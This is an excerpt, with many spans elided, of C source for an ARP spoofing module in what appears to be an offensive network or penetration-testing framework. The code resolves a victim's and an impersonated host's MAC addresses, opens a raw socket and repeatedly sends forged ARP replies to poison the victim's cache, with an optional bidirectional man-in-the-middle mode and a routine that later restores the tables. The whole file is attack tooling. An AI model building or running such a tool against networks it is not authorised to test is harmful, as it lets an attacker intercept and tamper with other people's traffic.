...
{
    switch (err) {
    case NYX_IFACE_SUCCESS:   return PH_ARPSPOOF_SUCCESS;
    case NYX_IFACE_ERR_PARAM: return PH_ARPSPOOF_ERR_INVALID_PARAM;
    case NYX_IFACE_ERR_NOTFOUND: return PH_ARPSPOOF_ERR_NO_IFACE;
    case NYX_IFACE_ERR_SOCKET:   return PH_ARPSPOOF_ERR_SOCKET;
    case NYX_IFACE_ERR_PERM:     return PH_ARPSPOOF_ERR_PERMISSION;
    default: return PH_ARPSPOOF_ERR_RESOLVE;
    }
}
...
static int build_and_send_arp_reply(const ph_arpspoof_session_t *session,
                                    ...
                                    const uint8_t *sender_mac)
{
    ...
    int arp_len = nyx_packet_create_arp(frame + ETHERNET_HEADER_LEN,
                                       sizeof(frame) - ETHERNET_HEADER_LEN,
                                       &arp);
    if (arp_len < 0) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_SEND,
                         NYX_ERROR_SEV_ERROR, "Failed to build ARP packet",
                         "Internal packet crafting error");
    ...
    ssize_t sent = sendto(session->sockfd, frame, sizeof(frame), 0,
...
{
    if (!config || !session) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM,
                         NYX_ERROR_SEV_ERROR, "NULL config or session pointer",
    ...
    if (inet_pton(AF_INET, config->target_ip, &tmp) != 1) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_IP,
                         NYX_ERROR_SEV_ERROR, "Invalid target IP address",
                         "Use dotted-quad format (e.g. 192.168.1.5)");
        return PH_ARPSPOOF_ERR_INVALID_IP;
    }
    if (inet_pton(AF_INET, config->spoof_ip, &tmp) != 1) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_IP,
                         NYX_ERROR_SEV_ERROR, "Invalid spoof IP address",
                         "Use dotted-quad format (e.g. 192.168.1.1)");
        return PH_ARPSPOOF_ERR_INVALID_IP;
    }

    /* Validate interface */
    if (!nyx_iface_is_valid(config->iface)) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_NO_IFACE,
                         NYX_ERROR_SEV_ERROR, "Interface not found",
    ...
    if (!s) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_SOCKET,
                         NYX_ERROR_SEV_CRITICAL, "Memory allocation failed",
    ...
    /* Get local MAC */
    int ret = nyx_iface_get_mac(config->iface, s->local_mac_str,
                               sizeof(s->local_mac_str));
    if (ret != NYX_IFACE_SUCCESS) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, map_iface_error(ret),
                         NYX_ERROR_SEV_ERROR,
    ...
    if (s->if_index == 0) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_NO_IFACE,
                         NYX_ERROR_SEV_ERROR, "Failed to get interface index",
    ...
    if (fd < 0) {
        ...
        if (err == EPERM || err == EACCES) {
            NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_PERMISSION,
                             NYX_ERROR_SEV_ERROR,
        ...
        return (err == EPERM || err == EACCES)
                   ? PH_ARPSPOOF_ERR_PERMISSION
                   : PH_ARPSPOOF_ERR_SOCKET;
    }
    s->sockfd = fd;

    /* Resolve target MAC */
    ret = nyx_iface_get_mac_by_ip(config->iface, config->target_ip,
                                 s->target_mac_str,
                                 sizeof(s->target_mac_str));
    if (ret != NYX_IFACE_SUCCESS) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_RESOLVE,
                         NYX_ERROR_SEV_ERROR,
    ...
    ret = nyx_iface_get_mac_by_ip(config->iface, config->spoof_ip,
                                 s->spoof_mac_str,
    ...
    *session = s;
    ...
    nyx_log(NYX_LOG_INFO, "  Target     : %s (%s)", config->target_ip,
            s->target_mac_str);
                            ...
                            const char *ip, char *mac_buf, size_t len)
{
    if (!session || !ip || !mac_buf || len < PH_ARPSPOOF_MAX_MAC_LEN) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM,
                         NYX_ERROR_SEV_ERROR, "Invalid parameters for MAC resolve",
                           ...
                           const char *impersonated_ip)
{
    if (!session || !victim_ip || !victim_mac || !impersonated_ip) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM,
                         NYX_ERROR_SEV_ERROR, "NULL argument to send_reply",
    ...
    return build_and_send_arp_reply(session, victim_mac,
                                    sender_addr.s_addr,
                                    target_addr.s_addr,
                                    session->local_mac);
}
...
int ph_arpspoof_start(ph_arpspoof_session_t *session)
{
    if (!session) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM,
                         NYX_ERROR_SEV_ERROR, "NULL session",
                         "Provide a valid initialised session handle");
        return PH_ARPSPOOF_ERR_INVALID_PARAM;
    }

    if (session->running) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_BUSY,
                         NYX_ERROR_SEV_WARNING,
                         "Spoofing session already running",
    ...
    nyx_log(NYX_LOG_INFO, "Sending ARP replies every %d second(s) "
    ...
    while (session->running) {
        ...
        int ret = build_and_send_arp_reply(session,
                                           session->target_mac,
                                           spoof_addr.s_addr,
                                           target_addr.s_addr,
                                           session->local_mac);
        ...
        if (session->config.bidirectional) {
            ret = build_and_send_arp_reply(session,
                                           session->spoof_mac,
                                           target_addr.s_addr,
                                           spoof_addr.s_addr,
                                           session->local_mac);
        ...
        if (nyx_logger_verbose > 0) {
            nyx_log(NYX_LOG_VERBOSE,
                    "Poison cycle %lu sent to %s as %s%s",
                    count,
                    session->config.target_ip,
                    session->config.spoof_ip,
                    session->config.bidirectional ? " [bidirectional]" : "");
        } else if (!nyx_term_is_interactive() &&
                   (count == 1 || (count % 10) == 0)) {
...
int ph_arpspoof_restore(ph_arpspoof_session_t *session)
{
    ...
    nyx_log(NYX_LOG_INFO, "Restoring ARP tables (%d gratuitous replies)...",
            ARP_RESTORE_COUNT);

    int last_ret = PH_ARPSPOOF_SUCCESS;

    for (int i = 0; i < ARP_RESTORE_COUNT; i++) {
        nyx_term_progress("Restoring ARP tables", (size_t)i + 1,
                          (size_t)ARP_RESTORE_COUNT);
